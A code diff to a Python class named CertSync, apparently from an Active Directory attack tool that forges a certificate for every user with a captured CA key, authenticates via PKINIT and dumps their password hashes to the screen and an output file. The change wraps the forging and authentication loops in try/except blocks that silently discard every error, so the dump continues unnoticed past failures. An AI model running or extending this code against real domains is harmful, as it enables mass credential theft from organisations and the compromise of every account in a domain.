@@ -236,11 +236,17 @@ class CertSync:
         if self.randomize:
             for user in (tqdm(users.values()) if self.options.debug else users.values()):
                 base_user_key, base_user_cert = self.forge_cert_base()
-                user.forge_cert(key=base_user_key, cert=base_user_cert, ca_key=self.ca_key, ca_cert=self.ca_cert)
+                try:
+                    user.forge_cert(key=base_user_key, cert=base_user_cert, ca_key=self.ca_key, ca_cert=self.ca_cert)
+                except Exception:
+                    pass
         else:
             base_user_key, base_user_cert = self.forge_cert_base()
             for user in (tqdm(users.values()) if self.options.debug else users.values()):
-                user.forge_cert(key=base_user_key, cert=base_user_cert, ca_key=self.ca_key, ca_cert=self.ca_cert)
+                try:
+                    user.forge_cert(key=base_user_key, cert=base_user_cert, ca_key=self.ca_key, ca_cert=self.ca_cert)
+                except Exception:
+                    pass
 
         # 4. PKINIT every users
         logging.info("PKINIT + UnPAC the hashes")
@@ -249,14 +255,17 @@ class CertSync:
         
         for user in users.values():
             sleep(self.timeout + random.randint(0,self.jitter))
-            if user.auth(target=self.target):
-                synced += 1
-                secretsdump = user.to_str()
-                print(secretsdump)
-                if self.outputfile is not None:
-                    self.outputfile.write(secretsdump + "\n")
-            else:
-                not_synced += 1
+            try:
+                if user.auth(target=self.target):
+                    synced += 1
+                    secretsdump = user.to_str()
+                    print(secretsdump)
+                    if self.outputfile is not None:
+                        self.outputfile.write(secretsdump + "\n")
+                else:
+                    not_synced += 1
+            except Exception:
+                pass
         logging.debug("%s users dumped. %s users could not be dumped." % (synced, not_synced))
 
     def forge_cert_base(self):
